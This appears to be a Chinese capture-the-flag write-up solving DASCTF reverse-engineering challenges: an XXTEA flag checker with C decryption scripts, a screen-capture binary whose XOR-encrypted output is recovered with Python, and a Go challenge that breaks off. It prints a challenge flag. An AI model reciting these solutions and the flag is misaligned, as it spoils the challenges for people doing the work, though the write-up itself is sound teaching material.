替换成bin2, 然后再去运行这个 ez_py.pyc‍​‍也是意料之中成长解密了bin2也运行了‍​​​​接下来用 IDA Pro 分析 bin2‍一个 btea 加密int __cdecl main(int argc, const char **argv, const char **envp){  int flag[11]; // [esp+10h] [ebp-B8h]  int key[4]; // [esp+3Ch] [ebp-8Ch] BYREF  int v6[12]; // [esp+4Ch] [ebp-7Ch] BYREF  char Str[50]; // [esp+7Eh] [ebp-4Ah] BYREF  int k; // [esp+B0h] [ebp-18h]  int j; // [esp+B4h] [ebp-14h]  size_t i; // [esp+B8h] [ebp-10h]  char *v11; // [esp+BCh] [ebp-Ch]  __main();  printf(\"please input your flag:\\n\");  scanf(\"%s\", Str);  if ( strlen(Str) != 44 )  {    MessageBoxA(0, \"worng length!\", &amp;Caption, 0);    exit(0);  }  v11 = Str;  for ( i = 0; strlen(Str) &gt;&gt; 2 &gt; i; ++i )  {    v6[i] = *(_DWORD *)v11;    v11 += 4;  }  key[0] = 0x4B5F;  key[1] = 0xDEAD;  key[2] = 0x11ED;  key[3] = 0xB3CC;  btea((unsigned int *)v6, 11, key);            // 加密  for ( j = 0; j &lt;= 10; ++j )    ;  flag[0] = 0xCC45699D;  flag[1] = 0x683D5352;  flag[2] = 0xB8BB71A0;  flag[3] = 0xD3817AD;  flag[4] = 0x7547E79E;  flag[5] = 0x4BDD8C7C;  flag[6] = 0x95E25A81;  flag[7] = 0xC4525103;  flag[8] = 0x7049B46F;  flag[9] = 0x5417F77C;  flag[10] = 0x65567138;  for ( k = 0; k &lt;= 10; ++k )  {    if ( flag[k] != v6[k] )    {      MessageBoxA(0, \"error!\", &amp;Caption, 0);      exit(0);    }  }  MessageBoxA(0, \"right!\", &amp;Caption, 0);  return 0;}  bteaint __cdecl btea(unsigned int a1[], int a2, int a3[]){  unsigned int *v3; // eax  int *v4; // eax  int result; // eax  unsigned int *v6; // eax  int v7; // [esp+8h] [ebp-20h]  int v8; // [esp+8h] [ebp-20h]  int v9; // [esp+Ch] [ebp-1Ch]  int v10; // [esp+Ch] [ebp-1Ch]  unsigned int j; // [esp+10h] [ebp-18h]  int i; // [esp+10h] [ebp-18h]  unsigned int v13; // [esp+14h] [ebp-14h]  unsigned int v14; // [esp+14h] [ebp-14h]  unsigned int v15; // [esp+18h] [ebp-10h]  unsigned int v16; // [esp+1Ch] [ebp-Ch]  int a2a; // [esp+34h] [ebp+Ch]  if ( a2 &lt;= 1 )  {    if ( a2 &lt; -1 )    {      a2a = -a2;      v10 = 52 / a2a + 6;      v14 = 2033695134 * v10;      v16 = *a1;      do      {        v8 = (v14 &gt;&gt; 2) &amp; 3;        for ( i = a2a - 2; i; --i )        {          v6 = &amp;a1[i];          *v6 -= ((v16 ^ v14) + (a1[i - 1] ^ a3[v8 ^ i &amp; 3])) ^ (((4 * v16) ^ (a1[i - 1] &gt;&gt; 5))                                                               + ((v16 &gt;&gt; 3) ^ (16 * a1[i - 1])));          v16 = *v6;        }        *a1 -= (((4 * v16) ^ (a1[a2a - 1] &gt;&gt; 5)) + ((v16 &gt;&gt; 3) ^ (16 * a1[a2a - 1]))) ^ ((v16 ^ v14)                                                                                       + (a1[a2a - 1] ^ a3[v8]));        result = *a1;        v16 = *a1;        v14 -= 2033695134;        --v10;      }      while ( v10 );    }  }  else  {    v9 = 52 / a2;    v13 = 0;    v15 = a1[a2 - 1];    do    {      v13 += 0x7937B99E;      v7 = (v13 &gt;&gt; 2) &amp; 3;      for ( j = 0; j &lt; a2 - 1; ++j )      {        v3 = &amp;a1[j];        *v3 += ((a1[j + 1] ^ v13) + (v15 ^ a3[v7 ^ j &amp; 3])) ^ (((4 * a1[j + 1]) ^ (v15 &gt;&gt; 5))                                                             + ((a1[j + 1] &gt;&gt; 3) ^ (16 * v15)));        v15 = *v3;      }      v4 = (int *)&amp;a1[a2 - 1];      *v4 += ((*a1 ^ v13) + (v15 ^ a3[v7 ^ j &amp; 3])) ^ (((4 * *a1) ^ (v15 &gt;&gt; 5)) + ((*a1 &gt;&gt; 3) ^ (16 * v15)));      result = *v4;      v15 = result;      --v9;    }    while ( v9 );  }  return result;}‍baidu 到了俩解密的，需要修改部分代码，也简单，改完解密直接flag‍  btea解密脚本1#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; #define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z); //long btea(long* v, long n, long* k) {int btea(int* v, int n, int* k) {\tunsigned long z=v[n-1], y=v[0], sum=0, e, DELTA=0x7937B99E;\tlong p, q ;\tif (n &gt; 1) {          /* Coding Part */\t\t//q = 6 + 52/n;\t\tq = 52/n;\t\twhile (q-- &gt; 0) {\t\t\tsum += DELTA;\t\t\te = (sum &gt;&gt; 2) &amp; 3;\t\t\tfor (p=0; p&lt;n-1; p++) y = v[p+1], z = v[p] += MX;\t\t\ty = v[0];\t\t\tz = v[n-1] += MX;\t\t}\t\treturn 0 ; \t} else if (n &lt; -1) {  /* Decoding Part */\t\tn = -n;\t\t//q = 6 + 52/n;\t\tq =  52/n;\t\tsum = q*DELTA ;\t\twhile (sum != 0) {\t\t\te = (sum &gt;&gt; 2) &amp; 3;\t\t\tfor (p=n-1; p&gt;0; p--) z = v[p-1], y = v[p] -= MX;\t\t\tz = v[n-1];\t\t\ty = v[0] -= MX;\t\t\tsum -= DELTA;\t\t}\t\treturn 0;\t}\treturn 1;}int main(int argc, char const *argv[]){    int key[4]={0};    key[0] = 0x4B5F;    key[1] = 0xDEAD;    key[2] = 0x11ED;    key[3] = 0xB3CC;    int flag[11] = {0};    flag[0] = 0xCC45699D;    flag[1] = 0x683D5352;    flag[2] = 0xB8BB71A0;    flag[3] = 0xD3817AD;    flag[4] = 0x7547E79E;    flag[5] = 0x4BDD8C7C;    flag[6] = 0x95E25A81;    flag[7] = 0xC4525103;    flag[8] = 0x7049B46F;    flag[9] = 0x5417F77C;    flag[10] = 0x65567138;    btea(flag,-11,key);    printf(\"%s\\n\",flag);    return 0;}  btea解密脚本2#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x7937B99E// #define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))   void btea(uint32_t *v, int n, uint32_t const key[4]) {    uint32_t y, z, sum;    unsigned p, rounds, e;    if (n &gt; 1) {          /* Coding Part */      rounds = 52/n;      //rounds = 6 + 52/n;      sum = 0;      z = v[n-1];      do {        sum += DELTA;        e = (sum &gt;&gt; 2) &amp; 3;        for (p=0; p&lt;n-1; p++) {          y = v[p+1];          z = v[p] += MX;        }        y = v[0];        z = v[n-1] += MX;      } while (--rounds);    } else if (n &lt; -1) {  /* Decoding Part */      n = -n;      rounds = 52/n;      //rounds = 6 + 52/n;      sum = rounds*DELTA;      y = v[0];      do {        e = (sum &gt;&gt; 2) &amp; 3;        for (p=n-1; p&gt;0; p--) {          z = v[p-1];          y = v[p] -= MX;        }        z = v[n-1];        y = v[0] -= MX;      } while ((sum -= DELTA) != 0);    }  } int main(){    //uint32_t const key[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    uint32_t key[4] = {0};    key[0] = 0x4B5F;    key[1] = 0xDEAD;    key[2] = 0x11ED;    key[3] = 0xB3CC;    //uint32_t data[2]={0x12345678,0x87654321};    uint32_t data[11];    data[0] = 0xCC45699D;    data[1] = 0x683D5352;    data[2] = 0xB8BB71A0;    data[3] = 0x0D3817AD;    data[4] = 0x7547E79E;    data[5] = 0x4BDD8C7C;    data[6] = 0x95E25A81;    data[7] = 0xC4525103;    data[8] = 0x7049B46F;    data[9] = 0x5417F77C;    data[10]= 0x65567138;    uint32_t *sent=data;    //btea(sent,1,key);    btea(sent,-11,key);    //printf(\"%s\\n\\n\",data);    for (int i = 0; i &lt; 44; i++){\t\tprintf(\"%c\",*((char *)data +i) &amp; 0xff);    }    return 0;}‍DASCTF{7eb20cb2-deac-11ed-ae42-94085339ce84}‍‍Reverse-cap‍  capture what?‍  主要逻辑代码  大概就是获取屏幕的图片 bmp 然后加密保存为cap.bin‍__int64 __fastcall sub_7FF651DA1030(HWND hWnd){  HBITMAP v2; // r14  HDC hdcSrc; // r13  HDC DC; // rsi  HDC CompatibleDC; // r15  int hSrc; // ebx  int wSrc; // eax  HBITMAP CompatibleBitmap; // rax  signed int v9; // ebx  HANDLE FileW; // rax  void *v11; // r12  signed int v12; // r10d  _BYTE *v13; // r9  int v14; // ecx  int v15; // edx  void *lpBuffer; // [rsp+60h] [rbp-59h]  HGLOBAL hMem; // [rsp+68h] [rbp-51h]  struct tagRECT Rect; // [rsp+70h] [rbp-49h] BYREF  struct tagBITMAPINFO bmi; // [rsp+80h] [rbp-39h] BYREF  char v21; // [rsp+ACh] [rbp-Dh]  char v22; // [rsp+ADh] [rbp-Ch]  char v23; // [rsp+AEh] [rbp-Bh]  char v24; // [rsp+AFh] [rbp-Ah]  char v25; // [rsp+B0h] [rbp-9h]  char v26; // [rsp+B1h] [rbp-8h]  int v27; // [rsp+B2h] [rbp-7h]  DWORD NumberOfBytesWritten; // [rsp+B8h] [rbp-1h] BYREF  char pv[4]; // [rsp+C0h] [rbp+7h] BYREF  LONG v30; // [rsp+C4h] [rbp+Bh]  UINT cLines; // [rsp+C8h] [rbp+Fh]  NumberOfBytesWritten = 0;  v2 = 0i64;  hdcSrc = GetDC(0i64);  DC = GetDC(hWnd);                             // GetDC函数为一个指定窗口的客户端区域或者整个屏幕从一个设备上下文(DC)中提取一个句柄  CompatibleDC = CreateCompatibleDC(DC);  if ( CompatibleDC )  {    GetClientRect(hWnd, &amp;Rect);    SetStretchBltMode(DC, 4);    hSrc = GetSystemMetrics(1);    wSrc = GetSystemMetrics(0);    if ( StretchBlt(DC, 0, 0, Rect.right, Rect.bottom, hdcSrc, 0, 0, wSrc, hSrc, 0xCC0020u) )    {      CompatibleBitmap = CreateCompatibleBitmap(DC, Rect.right - Rect.left, Rect.bottom - Rect.top);// CreateCompatibleBitmap函数创建的位图的颜色格式与hdc参数标识的设备的颜色格式匹配      v2 = CompatibleBitmap;      if ( CompatibleBitmap )      {        SelectObject(CompatibleDC, CompatibleBitmap);        if ( BitBlt(CompatibleDC, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, DC, 0, 0, 0xCC0020u) )        {          GetObjectW(v2, 32, pv);          bmi.bmiHeader.biWidth = v30;          bmi.bmiHeader.biHeight = cLines;          bmi.bmiHeader.biSize = 0x28;          *&amp;bmi.bmiHeader.biPlanes = 2097153i64;          memset(&amp;bmi.bmiHeader.biSizeImage, 0, 20);          v9 = 4 * cLines * ((32 * v30 + 31) / 32);          hMem = GlobalAlloc(0x42u, v9);          lpBuffer = GlobalLock(hMem);          GetDIBits(DC, v2, 0, cLines, lpBuffer, &amp;bmi, 0);          FileW = CreateFileW(L\"cap.bin\", 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);          v23 ^= 0x64u;          v24 ^= 0x61u;          v11 = FileW;          v25 ^= 0x73u;          v26 ^= 0x63u;          bmi.bmiHeader.biSize ^= 0x79625F63u;          bmi.bmiHeader.biWidth ^= 0x7361645Fu;          bmi.bmiHeader.biHeight ^= 0x65667463u;          *&amp;bmi.bmiHeader.biPlanes ^= 7017839094296175470ui64;          bmi.bmiColors[0].rgbReserved = ((v9 + 54) &gt;&gt; 8) ^ 0x62;          v21 = ((v9 + 54) &gt;&gt; 16) ^ 0x79;          v22 = ((v9 + 54) &gt;&gt; 24) ^ 0x5F;          v27 = 1852139074;          qmemcpy(bmi.bmiColors, \",.\", 2);          bmi.bmiColors[0].rgbRed = (v9 + 54) ^ 0x5F;          v12 = 0;          bmi.bmiHeader.biSizeImage ^= 0x66746373u;          bmi.bmiHeader.biXPelsPerMeter ^= 0x5F636E65u;          bmi.bmiHeader.biYPelsPerMeter ^= 0x645F7962u;          bmi.bmiHeader.biClrUsed ^= 0x74637361u;          bmi.bmiHeader.biClrImportant ^= 0x636E6566u;          if ( v9 &gt; 0 )          {            v13 = lpBuffer;            do            {              v14 = v12 + 3;              v15 = (1321528399i64 * (v12 + 3)) &gt;&gt; 32;              ++v12;              *v13++ ^= key[v14 - 13 * ((v15 &gt;&gt; 31) + (v15 &gt;&gt; 2))];            }            while ( v12 &lt; v9 );          }          WriteFile(FileW, bmi.bmiColors, 0xEu, &amp;NumberOfBytesWritten, 0i64);          WriteFile(v11, &amp;bmi, 0x28u, &amp;NumberOfBytesWritten, 0i64);          WriteFile(v11, lpBuffer, v9, &amp;NumberOfBytesWritten, 0i64);          GlobalUnlock(hMem);          GlobalFree(hMem);          CloseHandle(v11);        }        else        {          MessageBoxW(hWnd, L\"BitBlt has failed\", L\"Failed\", 0);        }      }      else      {        MessageBoxW(hWnd, L\"CreateCompatibleBitmap Failed\", L\"Failed\", 0);      }    }    else    {      MessageBoxW(hWnd, L\"StretchBlt has failed\", L\"Failed\", 0);    }  }  else  {    MessageBoxW(hWnd, L\"CreateCompatibleDC has failed\", L\"Failed\", 0);  }  DeleteObject(v2);  DeleteObject(CompatibleDC);  ReleaseDC(0i64, hdcSrc);  ReleaseDC(hWnd, DC);  return 0i64;}‍最后写入的lpBuffer也就是bmp 图像的数据段v3 指向的地址也就是 plBuffer‍  接下来就是找到v3 是和谁异或的,取得是key[]的值。动态分析一下把和 v13 异或的值取出来‍*v13++ ^= key[v14 - 13 * ((v15 &gt;&gt; 31) + (v15 &gt;&gt; 2))];‍​‍  断点脚本eax = get_reg_value('eax')print(chr(eax),end='')‍基本就是按照这个循环去异或_by_dasctfenc‍  先拿一个正常的BMP 看一下结构‍​​‍​​现在除了前0x36不知道是啥，但是后面的信息我们已经清楚加密流程了  解密key = list(b'_by_dasctf')f1 = open('C:/Users/GameG/Downloads/cap/cap.bin','rb').read()[0x36:]f2 = open('C:/Users/GameG/Downloads/cap/data.bmp','wb')f1 = bytearray(f1)for i in range(len(f1)):    f1[i] = f1[i] ^ key[i % len(key)]f2.write(bytes([0]*0x36))f2.write(bytes(f1))f2.close()‍  结果,考虑到这里的数据是异或加密的，那前面的也可以尝试解一下‍​​  正常的bmp 这个地方都是00 00 , 但加密后 是 我们的 密钥 enc_by_dasctf ，任何数异或0都是它本身，正好呢，0x36位置异或的是 _ 正好和前面的 enc 衔接上，大概前面也是异或，只是异或key的顺序不同‍​​‍key = list(b'nc_by_dasctfe')f1 = open('C:/Users/GameG/Downloads/cap/cap.bin','rb').read()f2 = open('C:/Users/GameG/Downloads/cap/data.bmp','wb')f1 = bytearray(f1)for i in range(len(f1)):    f1[i] = f1[i] ^ key[i % len(key)]f2.write(bytes(f1))f2.close()得到 原始图片​​‍Reverse-unsym‍看到字符串里有 go 的特征，先用脚本恢复一下go符号https://github.com/renshareck/IDAGolangHelper_SupportGo1.20​​用 Findcrypt 找到了一些加密算法 AES‍​​NoNo~~~~~~~~~~~"
  }
  
]

